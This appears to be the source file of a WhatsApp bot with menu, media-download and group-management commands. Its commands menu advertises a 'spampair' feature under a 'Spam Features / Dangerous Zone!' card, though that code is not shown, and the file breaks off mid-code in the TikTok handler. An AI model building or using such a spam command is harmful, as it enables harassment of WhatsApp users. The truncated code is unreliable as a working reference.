/*
Base Whatsapp Bot
By DanuZz

Site: https://www.movanest.xyz
*/
require('./config');
const fs = require('fs');
const path = require('path');
const util = require('util');
const { exec } = require("child_process");
const yts = require('yt-search');
const fetch = require('node-fetch');
const {
    default: makeWASocket,
    makeWALegacySocket,
    BufferJSON,
    Browsers,
    initInMemoryKeyStore,
    extractMessageContent,
    makeInMemoryStore,
    proto,
    DisconnectReason,
    useMultiFileAuthState,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    prepareWAMessageMedia,
    downloadContentFromMessage,
    getBinaryNodeChild,
    jidDecode,
    areJidsSameUser,
    generateWAMessage,
    generateForwardMessageContent,
    generateWAMessageContent, 
    generateWAMessageFromContent,
    getAggregateVotesInPollMessage,
    WAMessageStubType,
    getContentType,
    relayMessage,
    WA_DEFAULT_EPHEMERAL,
    makeCacheableSignalKeyStore
} = require("bail");
const axios = require('axios');

module.exports = async (Dxz, m) => {
try {
const body = (
  (m.mtype === 'conversation' && m.message.conversation) ||
  (m.mtype === 'imageMessage' && m.message.imageMessage?.caption) ||
  (m.mtype === 'documentMessage' && m.message.documentMessage?.caption) ||
  (m.mtype === 'videoMessage' && m.message.videoMessage?.caption) ||
  (m.mtype === 'extendedTextMessage' && m.message.extendedTextMessage?.text) ||
  (m.mtype === 'buttonsResponseMessage' && m.message.buttonsResponseMessage?.selectedButtonId) ||
  (m.mtype === 'listResponseMessage' && m.message.listResponseMessage?.singleSelectReply?.selectedRowId) ||
  (m.mtype === 'interactiveResponseMessage' &&
    JSON.parse(
      m.message.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson || '{}'
    ).id
  ) ||
  (m.mtype === 'templateButtonReplyMessage' && m.message.templateButtonReplyMessage?.selectedId) ||
  (m.mtype === 'messageContextInfo' &&
    (
      m.message.buttonsResponseMessage?.selectedButtonId ||
      m.message.listResponseMessage?.singleSelectReply?.selectedRowId ||
      m.text
    )
  )
) || '';

const budy = (typeof m.text === 'string') ? m.text : '';
const prefix = global.prefix;
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (Dxz.user.id.split(':')[0]+'@s.whatsapp.net' || Dxz.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await Dxz.decodeJid(Dxz.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const isGroup = m.chat.endsWith('@g.us')
const developers = `${global.owner}`;
const isDanupa = senderNumber === "94766911711";
const isOwner = isBot ? isBot : developers.includes(senderNumber);
const groupMetadata = isGroup ? await Dxz.groupMetadata(m.chat) : {}
const groupName = m.isGroup ? groupMetadata.subject : ''
let participant_bot = isGroup ? groupMetadata.participants.find((v) => v.id == botNumber) : {}
let participant_sender = isGroup ? groupMetadata.participants.find((v) => v.id == m.sender) : {}
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participant_sender?.admin !== null ? true : false
const cmd = prefix + command
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

//~~~~~Case Features~~~~~//
switch(command) {

        case 'main':
        case 'list':
        case 'menus': 
        case 'menu': {
            await Dxz.sendMessage(m.chat, { react: { text: '🪺', key: m.key } });
    let menuText = `*Hey there!* 🌈 
_🧃 Thanks for check this bot!_ 
\`✿ 안녕 ۫  ˒˓ Created By - @Danu'Zz.\``;

    // Prepare the sections
    let rows = [
        {
            title: "Commands",
            description: "Powered by @DanuZz",
            id: `${prefix}commands`
        },
        // Add more rows here when needed
        // {
        //     title: "Another Service",
        //     description: "Short description here",
        //     id: "another"
        // },
    ];

    let sections = [
        {
            title: "@DanuZz Lk",
            highlight_label: "Wa - Bot",
            rows: rows,
        },
    ];

    const buttonMessage = {
        text: menuText,
        footer: footer,
        headerType: 1,
        viewOnce: true,
        buttons: [
            {
                buttonId: "action",
                buttonText: { displayText: "Click me ᐢᗜᐢ" },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: "Hii Babe ﹒♡﹒",
                        sections: sections
                    })
                }
            }
        ]
    };

    return Dxz.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;

case 'commands': {
    await Dxz.sendMessage(m.chat, { react: { text: '🧃', key: m.key } });

    let msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: `*✨ ૮₍ ˶•⤙•˶ ₎ა  Commands Menu*\nPlease choose a category ♡`
                        },
                        footer: {
                            text: footer
                        },
                        carouselMessage: {
                            cards: [
                                // ────────────── CARD 1 ────────────── DOWNLOADS
                                {
                                    header: proto.Message.InteractiveMessage.Header.create({
                                        title: `Download Commands`,
                                        subtitle: `@DanuZz`,
                                        productMessage: {
                                            product: {
                                                productImage: await image(cmdLogo), // replace with real func or url
                                                productId: "9116471035103640",
                                                title: `Downloads Section`,
                                                description: "Media downloader commands",
                                                currencyCode: "USD",
                                                priceAmount1000: "3000",
                                                retailerId: "4144242",
                                                url: wagc,
                                                productImageCount: 1,
                                            },
                                            businessOwnerJid: "94766911711@s.whatsapp.net",
                                        },
                                        hasMediaAttachment: false
                                    }),
                                    body: {
                                        text: `> 🎵 *${prefix}song*\n> 🎬 *${prefix}video*\n> 🎬 *${prefix}tiktok*\n> 🎬 *${prefix}facebook*\n> 🎬 *${prefix}instagram*\n> 🎵 *${prefix}csong*\n> 🏞️ *${prefix}image*`
                                    },
                                    nativeFlowMessage: {
                                        buttons: [
                                            {
                                                name: "cta_url",
                                                buttonParamsJson: JSON.stringify({
                                                    display_text: "Contact Owner",
                                                    url: "wa.me/94766911711"
                                                })
                                            },
                                        ],
                                    },
                                },

                                // ────────────── CARD 2 ────────────── UTILITY / INFO
                                {
                                    header: proto.Message.InteractiveMessage.Header.create({
                                        title: `Utility & Info`,
                                        subtitle: `@DanuZz`,
                                        productMessage: {
                                            product: {
                                                productImage: await image(cmdLogo),
                                                productId: "9116471035103640",
                                                title: `Bot Utilities`,
                                                description: "Check status & owner",
                                                currencyCode: "USD",
                                                priceAmount1000: "3000",
                                                retailerId: "4144242",
                                                url: wagc,
                                                productImageCount: 1,
                                            },
                                            businessOwnerJid: "94766911711@s.whatsapp.net",
                                        },
                                        hasMediaAttachment: false
                                    }),
                                    body: {
                                        text: `> ⚡ *${prefix}ping* → Check bot speed\n> 👤 *${prefix}owner* → Bot owner info\n> 📑 *${prefix}menu* → Full stylish menu`
                                    },
                                    nativeFlowMessage: {
                                        buttons: [
                                            {
                                                name: "cta_url",
                                                buttonParamsJson: JSON.stringify({
                                                    display_text: "Join Channel",
                                                    url: wagc
                                                })
                                            },
                                        ],
                                    },
                                },

                                // ────────────── CARD 3 ────────────── GROUP/CMDS
                                {
                                    header: proto.Message.InteractiveMessage.Header.create({
                                        title: `Group Commands`,
                                        subtitle: `@DanuZz`,
                                        productMessage: {
                                            product: {
                                                productImage: await image(cmdLogo),
                                                productId: "9116471035103640",
                                                title: `Group Utilities`,
                                                description: "Group Commands",
                                                currencyCode: "USD",
                                                priceAmount1000: "3000",
                                                retailerId: "4144242",
                                                url: wagc,
                                                productImageCount: 1,
                                            },
                                            businessOwnerJid: "94766911711@s.whatsapp.net",
                                        },
                                        hasMediaAttachment: false
                                    }),
                                    body: {
                                        text: `> 🔊 *${prefix}hidetag* → Silent tag all
> 📢 *${prefix}tagall* → Tag everyone + message
> 🎯 *${prefix}ctag* → Custom fancy tag
> 📝 *${prefix}setdesgc* → Set group description
> 🔔 *${prefix}open* → Unmute group
> 🔕 *${prefix}close* → Mute group
> 👤 *${prefix}add* → Add member
> 🗑️ *${prefix}kick* → Remove member`
                                    },
                                    nativeFlowMessage: {
                                        buttons: [
                                            {
                                                name: "cta_url",
                                                buttonParamsJson: JSON.stringify({
                                                    display_text: "Join Channel",
                                                    url: wagc
                                                })
                                            },
                                        ],
                                    },
                                },

                                // ────────────── CARD 4 ────────────── COMING SOON / MORE
                                {
                                    header: proto.Message.InteractiveMessage.Header.create({
                                        title: `Spam Features`,
                                        subtitle: `@DanuZz`,
                                        productMessage: {
                                            product: {
                                                productImage: await image(cmdLogo),
                                                productId: "9116471035103640",
                                                title: `Spam Features`,
                                                description: "Dangerous Zone!",
                                                currencyCode: "USD",
                                                priceAmount1000: "3000",
                                                retailerId: "4144242",
                                                url: wagc,
                                                productImageCount: 1,
                                            },
                                            businessOwnerJid: "94766911711@s.whatsapp.net",
                                        },
                                        hasMediaAttachment: false
                                    }),
                                    body: {
                                        text: `> 💀 *${prefix}spampair*`
                                    },
                                    nativeFlowMessage: {
                                        buttons: [
                                            {
                                                name: "cta_url",
                                                buttonParamsJson: JSON.stringify({
                                                    display_text: "Script & Updates",
                                                    url: "https://movanest.xyz"
                                                })
                                            },
                                        ],
                                    },
                                },
                            ],
                            messageVersion: 1,
                        },
                    },
                },
            },
        },
        { userJid: m.sender, quoted: m }
    );

    await Dxz.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id,
    });

    break;
}
        
case 'danuzz':
case 'dev': 
case 'owner': {
Dxz.sendMessage(m.chat, { react: { text: '👤', key: m.key }})

// Owner's contact information
  const ownerContact = {
  contacts: {
    displayName: 'My Contacts',
    contacts: [
      {
        displayName: "DanuZz",
        vcard: 'BEGIN:VCARD\n' +
          'VERSION:3.0\n' +
          'N:;DanuZz;;;\n' +
          'FN:DanuZz\n' +
          'ORG:null\n' +
          'TITLE:\n' +
          'item1.TEL;waid=94766911711:94766911711\n' +
          'item1.X-ABLabel:Ponsel\n' +
          'X-WA-BIZ-DESCRIPTION:Coder | Bot Developer\n' +
          'X-WA-BIZ-NAME:DanuZz\n' +
          'END:VCARD'
      }
    ]
  }
};

  // Owner's location information (optional)
  const ownerLocation = {
  location: {
    degreesLatitude: 37.7749,
    degreesLongitude: -122.4194,
    name: 'DanuZz Address',
    address: 'Rathnapura, SriLanka',
  },
};
    
let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: `*✨❤️‍🩹 Hii, Cutie!!*`
          },
          footer: {
            text: footer
          },
          carouselMessage: {
            cards: [
              {
                header: proto.Message.InteractiveMessage.Header.create({
                  title: ``,
                  subtitle: `@DanuZz`,
                  productMessage: {
                    product: {
                      productImage: await image(newOwnLogo),
                      productId: "9116471035103640",
                      title: `Script By - @Danu'Zz!!`,
                      description: "",
                      currencyCode: "USD",
                      priceAmount1000: "3000",
                      retailerId: "4144242",
                      url: wagc,
                      productImageCount: 1,
                    },
                    businessOwnerJid: "94766911711@s.whatsapp.net",
                  },
                  hasMediaAttachment: false
                }),
                body: {
                  text: `> 🤍 *Simple Wa Bot*
> Built for simplicity
> — *@Danu'Zz*
`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      "name": "cta_url",
                      "buttonParamsJson": "{\"display_text\":\"Owner\",\"url\":\"wa.me/94766911711\"}"
                    },
                  ],
                },
              },
              {
                header: proto.Message.InteractiveMessage.Header.create({
                  title: ``,
                  subtitle: `@DanuZz`,
                  productMessage: {
                    product: {
                      productImage: await image(ownercommandekelogoeka),
                      productId: "9116471035103640",
                      title: `Thnak For Check This Bot!!`,
                      description: "",
                      currencyCode: "USD",
                      priceAmount1000: "3000",
                      retailerId: "4144242",
                      url: wagc,
                      productImageCount: 1,
                    },
                    businessOwnerJid: "94766911711@s.whatsapp.net",
                  },
                  hasMediaAttachment: false
                }),
                body: {
                  text: `> 𝜗ৎ *S I M P L E  W A  —  B O T* ݁ ˖Ი𐑼⋆
> 🧩 Full Base Crafted by *DaNu'Zz*
> ⏳ Powerful Bot Script
> *Coming Soon…*
> ⚡ Clean • Fast • Stable`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      "name": "cta_url",
                      "buttonParamsJson": "{\"display_text\":\"@Simple Wa - Bot\",\"url\":\"movanest.xyz\"}"
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    },
  },
  { userJid: m.sender, quoted: m }
);
await Dxz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id,
});
  // Send contact message
  await Dxz.sendMessage(m.chat, ownerContact);
  
  // Send location message
  await Dxz.sendMessage(m.chat, ownerLocation);

  reply(`${pushname} *Thnx For Using* \`@Simple Wa - Bot\` 😊`);
}
break;

case 'img':
case 'image': {
    Dxz.sendMessage(m.chat, { react: { text: '🏞️', key: m.key }});
  if (!text) return reply(`❌ Example:\n${prefix}image cats`);

  const axios = require('axios');

  const api = `https://www.movanest.xyz/v2/googleimage?query=${encodeURIComponent(text)}`;
  const res = await axios.get(api);
  const images = res.data?.results?.images;

  if (!images || !images.length) {
    return m.reply('❌ No images found.');
  }

  let currentIndex = 0;

  // Helper to fetch image buffer
  const fetchImage = async (url) => {
    try {
      const img = await axios.get(url, {
        responseType: 'arraybuffer',
        headers: {
          'User-Agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36',
          'Referer': 'https://www.google.com'
        }
      });
      return img.data;
    } catch (err) {
      console.error('Image fetch error:', err.message);
      return null;
    }
  };

  const sendCurrentImage = async (index) => {
    const buffer = await fetchImage(images[index].url);
    if (!buffer) {
      return reply('❌ Failed to load this image.');
    }

    const caption = `🖼 *Google Image Search*\n\n🔍 Query: *${text}*\n\nImage ${index + 1} of ${images.length}`;

    const buttons = [
      {
        buttonId: `${prefix}image ${text}__${index + 1}`, // we encode next index
        buttonText: { displayText: '〣 Next Image' },
        type: 1
      }
    ];

    // If this is the last image → disable or change button
    if (index + 1 >= images.length) {
      buttons[0].buttonText.displayText = '🏁 End of results';
      buttons[0].type = 2; // optional: make it disabled-looking in some clients
    }

    await Dxz.sendMessage(m.chat, {
      image: buffer,
      caption: caption,
      footer: footer,
      buttons: buttons,
      headerType: 4,
    }, { quoted: m });
  };

  // Send first image
  await sendCurrentImage(currentIndex);

  break;
}
        
case 'csong': {
    const fetch = require('node-fetch');
    const yts = require('yt-search');
    const axios = require('axios');
    const fs = require('fs');
    const path = require('path');
    const os = require('os');
    const { exec } = require('child_process');

    Dxz.sendMessage(m.chat, { react: { text: '🎵', key: m.key } });

    if (!text) return reply("❗ Example: .csong <channelJid> <song name>");
    
    let args = text.split(" ");
    let channelJid = args[0];
    let query = args.slice(1).join(" ");

    if (!channelJid.includes("@")) return reply("❗ Please provide a valid channel JID.");
    if (!query) return reply("❗ Please enter the song name.");

    try {
        // 🔍 Search YouTube
        const search = await yts(query);
        if (!search.videos.length) return reply("❌ No results found on YouTube.");
        
        const video = search.videos[0];
        const videoUrl = video.url;
        const duration = video.timestamp;

        // ─────────────── New API ───────────────
        const apiUrl = `https://www.movanest.xyz/v2/ytdl2?input=${encodeURIComponent(videoUrl)}&format=audio`;
        const res = await fetch(apiUrl);
        const json = await res.json();

        if (!json?.status || !json?.results?.success || !json?.results?.recommended?.dlurl) {
            return Dxz.sendMessage(m.chat, { text: '❌ API did not return a valid download link' }, { quoted: m });
        }

        const dlUrl = json.results.recommended.dlurl;
        const title = json.results.title || video.title || "Unknown Title";
        let thumb = json.results.thumb || video.thumbnail || `https://i.ytimg.com/vi/${video.videoId}/hqdefault.jpg`;

        // Download MP3 to temp file (still needed for Opus conversion)
        const mp3Response = await axios.get(dlUrl, { responseType: 'arraybuffer' });
        const tempMp3 = path.join(os.tmpdir(), `${Date.now()}_input.mp3`);
        fs.writeFileSync(tempMp3, Buffer.from(mp3Response.data));

        // Convert to Opus/OGG (kept your original voice-note style)
        const tempOpus = path.join(os.tmpdir(), `${Date.now()}_output.opus`);
        await new Promise((resolve, reject) => {
            exec(`ffmpeg -i "${tempMp3}" -c:a libopus -b:a 128k -vbr on -compression_level 10 "${tempOpus}"`, (err) => {
                if (err) reject(err);
                else resolve();
            });
        });

        const opusBuffer = fs.readFileSync(tempOpus);

        // Optional: better thumbnail buffer
        let thumbBuffer = null;
        try {
            const thumbRes = await axios.get(thumb, { responseType: 'arraybuffer' });
            thumbBuffer = Buffer.from(thumbRes.data);
        } catch {}

        // Caption (your original beautiful styling)
        const caption = `*🪸 Simple Wa - Bot!!*

> _*🧃Title*_ : \`${title}\`
> _*🪺 Duration*_ : \`${duration}\`
> _*Thnk For Check Our Bot!! 😌✨*_`;

        // 1. Send preview image + caption to channel
        await Dxz.sendMessage(channelJid, {
            image: thumbBuffer || { url: thumb },
            caption: caption,
            jpegThumbnail: thumbBuffer || undefined
        });

        // 2. Send Opus audio (voice-note style + externalAdReply)
       await Dxz.sendMessage(channelJid, {
    audio: opusBuffer,
    mimetype: "audio/ogg; codecs=opus",
    ptt: true,
    fileName: `${title}.opus`
});

        // Cleanup
        if (fs.existsSync(tempMp3)) fs.unlinkSync(tempMp3);
        if (fs.existsSync(tempOpus)) fs.unlinkSync(tempOpus);

        reply("✅ Sent to channel successfully! (playable Opus audio)");

    } catch (error) {
        console.error(error);
        reply("⚠️ Error: " + (error.message || "unknown error"));
    }
    break;
}
        
case 'play':
case 'ytmp3':
case 'audio': 
case 'song': {
    await Dxz.sendMessage(m.chat, { react: { text: '🎵', key: m.key } });

    if (!text) {
        return Dxz.sendMessage(m.chat, { 
            text: `✘ Please provide a song name or YouTube link!\nExample: ${prefix}song perfect ed sheeran` 
        }, { quoted: m });
    }

    let query = text.trim();
    let videoId = null;
    let videoTitle = null;
    let videoUrl = null;

    // Check if it's already a YouTube URL
    const ytRegex = /(?:youtube\.com|youtu\.be)\/(?:watch\?v=)?([a-zA-Z0-9_-]{11})/;
    const match = query.match(ytRegex);

    if (match && match[1]) {
        // Direct URL provided
        videoId = match[1];
        videoUrl = `https://youtu.be/${videoId}`;
        // Optional: get title from yt-search or skip and use API directly
        try {
            const searchResults = await yts(videoUrl);
            videoTitle = searchResults.videos[0]?.title || "Downloaded Song";
        } catch {
            videoTitle = "Downloaded Song";
        }
    } else {
        // Text search
        try {
            const search = await yts(query);
            if (!search.videos.length) {
                return Dxz.sendMessage(m.chat, { text: "❌ No results found for: " + query }, { quoted: m });
            }
            const firstVideo = search.videos[0];
            videoId = firstVideo.videoId;
            videoTitle = firstVideo.title;
            videoUrl = firstVideo.url;
        } catch (err) {
            console.error(err);
            return Dxz.sendMessage(m.chat, { text: "❌ Error while searching YouTube." }, { quoted: m });
        }
    }

    // Prepare menu like your 'menu' command
    let menuText = `*Song Downloader 🎧*\n\n` +
                   `\`Title\`: *${videoTitle}*\n` +
                   `\`URL\`: ${videoUrl}\n\n` +
                   `_*Choose download type ↓*_`;

    let rows = [
        {
            title: "Audio (Play in WhatsApp)",
            description: "Send as voice/audio message",
            id: `${prefix}getsong audio ${videoUrl}`
        },
        {
            title: "Document (.mp3 file)",
            description: "Send as downloadable file",
            id: `${prefix}getsong document ${videoUrl}`
        },
    ];

    let sections = [
        {
            title: "Download Options",
            highlight_label: "Mp3 • @Simple Wa - Bot",
            rows: rows,
        },
    ];

    const buttonMessage = {
        text: menuText,
        footer: footer,
        headerType: 1,
        viewOnce: true,
        buttons: [
            {
                buttonId: "action",
                buttonText: { displayText: "Select Download Type ﹒ᗢ﹒" },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: "Choose Format ♪",
                        sections: sections
                    })
                }
            }
        ]
    };

    return Dxz.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;

// ──────────────── Helper command to actually download & send ────────────────
case 'getsong': {
    await Dxz.sendMessage(m.chat, { react: { text: '⬇️', key: m.key } });

    const args = text.trim().split(/ +/);
    if (args.length < 2) {
        return Dxz.sendMessage(m.chat, {
            text: `Usage: ${prefix}getsong [audio|document] <youtube url>`
        }, { quoted: m });
    }

    const type = args[0].toLowerCase();
    const url = args[1];

    if (!url.includes('youtu')) {
        return Dxz.sendMessage(m.chat, { text: "❌ Please provide a valid YouTube URL" }, { quoted: m });
    }

    try {
        // Using the newer /v2/ytdl2 endpoint with format=audio
        const apiUrl = `https://www.movanest.xyz/v2/ytdl2?input=${encodeURIComponent(url)}&format=audio`;
        const res = await fetch(apiUrl);
        const json = await res.json();

        if (!json?.status || !json?.results?.success || !json?.results?.recommended?.dlurl) {
            throw new Error("API did not return a valid download link");
        }

        const dlUrl = json.results.recommended.dlurl;
        const title = json.results.title || "Downloaded Song";
        const thumb = json.results.thumb || `https://i.ytimg.com/vi/${new URL(url).searchParams.get('v') || ''}/hqdefault.jpg`;
        const filename = `${title.replace(/[^a-zA-Z0-9]/g, '_')}.mp3`;

        if (type === 'audio') {
            // Send as playable audio (WhatsApp inline player)
            await Dxz.sendMessage(m.chat, {
                audio: { url: dlUrl },
                mimetype: 'audio/mpeg',
                fileName: filename,
                contextInfo: {
                    externalAdReply: {
                        title: title,
                        body: "Downloaded via @Simple Wa - Bot",
                        mediaType: 2,
                        thumbnailUrl: thumb,
                        sourceUrl: url
                    }
                }
            }, { quoted: m });
        }
        else if (type === 'document') {
            // Send as downloadable document
            await Dxz.sendMessage(m.chat, {
                document: { url: dlUrl },
                mimetype: 'audio/mpeg',
                fileName: filename,
                caption: `🎵 *${title}*\n\n> Downloaded via @Simple Wa - Bot`
            }, { quoted: m });
        }
        else {
            return Dxz.sendMessage(m.chat, { text: "❌ Invalid type! Use `audio` or `document`" }, { quoted: m });
        }

        await Dxz.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (err) {
        console.error("getsong error:", err.message);
        await Dxz.sendMessage(m.chat, {
            text: "😣 Couldn't download the song… maybe try another track?\n" + (err.message.includes("API") ? "(API issue)" : "")
        }, { quoted: m });
    }
}
break;

case 'mp4':
case 'ytmp4':
case 'vd': 
case 'video': {
    await Dxz.sendMessage(m.chat, { react: { text: '🎬', key: m.key } });

    if (!text) {
        return Dxz.sendMessage(m.chat, {
            text: `✘ Please provide a video name or YouTube link!\nExample: ${prefix}video perfect ed sheeran`
        }, { quoted: m });
    }

    let query = text.trim();
    let videoId = null;
    let videoTitle = null;
    let videoUrl = null;

    // ─── Detect direct YouTube link or search ───
    const ytRegex = /(?:youtube\.com|youtu\.be)\/(?:watch\?v=)?([a-zA-Z0-9_-]{11})/;
    const match = query.match(ytRegex);

    if (match && match[1]) {
        videoId = match[1];
        videoUrl = `https://youtu.be/${videoId}`;
        try {
            const searchResults = await yts(videoUrl);
            videoTitle = searchResults.videos[0]?.title || "Downloaded Video";
        } catch {
            videoTitle = "Downloaded Video";
        }
    } else {
        try {
            const search = await yts(query);
            if (!search.videos.length) {
                return Dxz.sendMessage(m.chat, { text: "❌ No results found for: " + query }, { quoted: m });
            }
            const firstVideo = search.videos[0];
            videoId = firstVideo.videoId;
            videoTitle = firstVideo.title;
            videoUrl = firstVideo.url;
        } catch (err) {
            console.error(err);
            return Dxz.sendMessage(m.chat, { text: "❌ Error while searching YouTube." }, { quoted: m });
        }
    }

    // ─── Optional: Early peek at available formats (but we do full fetch later) ───
    // For now we show title & then let user choose → real fetch in getvideo

    let menuText = `*Video Downloader 🎥*\n\n` +
                   `\`Title\`: *${videoTitle}*\n` +
                   `\`URL\`: ${videoUrl}\n\n` +
                   `_*Fetching available qualities... Choose type & quality ↓*_`;

    // We'll show generic rows first — actual qualities shown in getvideo helper is dynamic
    // But to make it nicer, we can do a quick pre-fetch here (recommended)

    let availableQualities = new Set();

    try {
        const apiUrl = `https://www.movanest.xyz/v2/ytdown?url=${encodeURIComponent(videoUrl)}`;
        const res = await fetch(apiUrl);
        const json = await res.json();

        if (json?.status && Array.isArray(json?.formats)) {
            json.formats.forEach(fmt => {
                if (fmt.type === "video" && fmt.quality && fmt.url) {
                    availableQualities.add(fmt.quality);
                }
            });
        }
    } catch (e) {
        console.log("Pre-fetch qualities failed:", e);
        // fallback: show common ones
        availableQualities = new Set([144, 240, 360, 480, 720, 1080]);
    }

    // Sort descending (highest first)
    const sortedQualities = [...availableQualities].sort((a, b) => b - a);

    let rows = [];

    for (const q of sortedQualities) {
        rows.push(
            {
                title: `${q}p - Playable Video`,
                description: `Stream in WhatsApp (${q}p)`,
                id: `${prefix}getvideo video ${videoUrl} ${q}`
            },
            {
                title: `${q}p - Video Document`,
                description: `Download .mp4 file (${q}p)`,
                id: `${prefix}getvideo document ${videoUrl} ${q}`
            }
        );
    }

    // Fallback if no qualities detected
    if (rows.length === 0) {
        rows = [
            { title: "Best Available - Video", description: "Playable in WhatsApp", id: `${prefix}getvideo video ${videoUrl} best` },
            { title: "Best Available - Document", description: "Download file", id: `${prefix}getvideo document ${videoUrl} best` }
        ];
    }

    let sections = [
        {
            title: "Available Qualities",
            highlight_label: "YouTube • @Simple Wa - Bot",
            rows: rows,
        },
    ];

    const buttonMessage = {
        text: menuText,
        footer: footer,
        headerType: 1,
        viewOnce: true,
        buttons: [
            {
                buttonId: "action",
                buttonText: { displayText: "Select Quality & Format 🎞️" },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: "Choose Video Format",
                        sections: sections
                    })
                }
            }
        ]
    };

    return Dxz.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;


// ──────────────── Helper: Download & Send ────────────────
case 'getvideo': {
    await Dxz.sendMessage(m.chat, { react: { text: '⬇️', key: m.key } });

    const args = text.trim().split(/ +/);
    if (args.length < 3) {
        return Dxz.sendMessage(m.chat, {
            text: `Usage: ${prefix}getvideo [video|document] <youtube url> <quality|best>\nExample:\n${prefix}getvideo video https://youtu.be/abc123 720\n${prefix}getvideo document https://youtu.be/abc123 best`
        }, { quoted: m });
    }

    const type = args[0].toLowerCase();
    const url = args[1];
    let requestedQuality = args[2].toLowerCase();

    if (!url.includes('youtu')) {
        return Dxz.sendMessage(m.chat, { text: "❌ Invalid YouTube URL" }, { quoted: m });
    }

    try {
        const apiUrl = `https://www.movanest.xyz/v2/ytdown?url=${encodeURIComponent(url)}`;
        const res = await fetch(apiUrl);
        const json = await res.json();

        if (!json?.status || !Array.isArray(json?.formats)) {
            throw new Error("Invalid API response - no formats found");
        }

        let selectedFormat = null;

        if (requestedQuality === 'best') {
            // Highest quality first
            selectedFormat = json.formats
                .filter(f => f.type === "video" && f.url)
                .sort((a, b) => (b.quality || 0) - (a.quality || 0))[0];
        } else {
            const qNum = parseInt(requestedQuality.replace('p', ''), 10);
            selectedFormat = json.formats.find(f =>
                f.type === "video" &&
                f.quality === qNum &&
                f.url
            );
        }

        if (!selectedFormat || !selectedFormat.url) {
            throw new Error(`Quality ${requestedQuality} not available`);
        }

        const dlUrl = selectedFormat.url;
        const qualityLabel = selectedFormat.label || `${selectedFormat.quality}p`;
        const title = json.title || "Downloaded Video";
        const thumb = json.thumbnail || `https://i.ytimg.com/vi/${new URL(url).searchParams.get('v') || ''}/hqdefault.jpg`;
        const filename = `${title.replace(/[^a-zA-Z0-9]/g, '_')}_${qualityLabel.replace(/\s+/g, '')}.mp4`;

        const displayQuality = qualityLabel.includes('p') ? qualityLabel : `${selectedFormat.quality}p`;

        if (type === 'video') {
            await Dxz.sendMessage(m.chat, {
                video: { url: dlUrl },
                mimetype: 'video/mp4',
                fileName: filename,
                caption: `🎬 *${title}* (${displayQuality})\n\n> Downloaded via @Simple Wa - Bot`,
                contextInfo: {
                    externalAdReply: {
                        title: title,
                        body: `${displayQuality} • YouTube Video`,
                        mediaType: 2,
                        thumbnailUrl: thumb,
                        sourceUrl: url
                    }
                }
            }, { quoted: m });
        }
        else if (type === 'document') {
            await Dxz.sendMessage(m.chat, {
                document: { url: dlUrl },
                mimetype: 'video/mp4',
                fileName: filename,
                caption: `🎥 *${title}* (${displayQuality})\nFile size depends on quality.\n\n> Downloaded via @Simple Wa - Bot`
            }, { quoted: m });
        }
        else {
            return Dxz.sendMessage(m.chat, { text: "❌ Use \`video\` or \`document\`" }, { quoted: m });
        }

        await Dxz.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (err) {
        console.error("getvideo error:", err.message);
        await Dxz.sendMessage(m.chat, {
            text: `😣 Download failed.\n${err.message.includes("not available") ? `Quality ${requestedQuality} not available for this video.` : "API or network issue."}\nTry another quality or video.`
        }, { quoted: m });
    }
}
break;

case 'tiktok':
case 'tt':
case 'tts':
case 'tiktok-search':
case 'tik':
case 'tiktokdl': {
    await Dxz.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    if (!text) {
        return Dxz.sendMessage(m.chat, {
            text: `✘ Please provide a TikTok link or search term!\n\nExamples:\n${prefix}tiktok https://www.tiktok.com/@user/video/123...\n${prefix}tiktok funny cat`
        }, { quoted: m });
    }

    const input = text.trim();

    // ──── 1. Direct URL case ────
    if (input.includes('tiktok.com') || input.includes('vm.tiktok.com') || input.includes('vt.tiktok.com')) {
        let videoUrl = input;

        // Try to normalize short links if needed (optional - many APIs handle vm/vt)
        try {
            const apiUrl = `https://www.movanest.xyz/v2/tiktok?url=${encodeURIComponent(videoUrl)}`;
            const res = await fetch(apiUrl);
            const json = await res.json();

            if (!json?.status || !json?.results) {
                throw new Error("API returned invalid response");
            }

            const data = json.results;
            const title = data.title || "TikTok Video";
            const thumb = data.cover || data.origin_cover || "https://i.imgur.com/0Z5Z5Z5.jpg";

            let menuText = `*TikTok Downloader ♻️*\n\n` +
                           `\`Title\`: *${title}*\n` +
                           `\`URL\`: ${videoUrl}\n\n` +
                           `_*Choose format ↓*_`;

            let rows = [
                {
                    title: "Video (No Watermark)",
                    description: "Clean video without TikTok logo",
                    id: `${prefix}gettt nowm ${videoUrl}`
                },
                {
                    title: "Video + WM",
                    description: "Original with watermark",
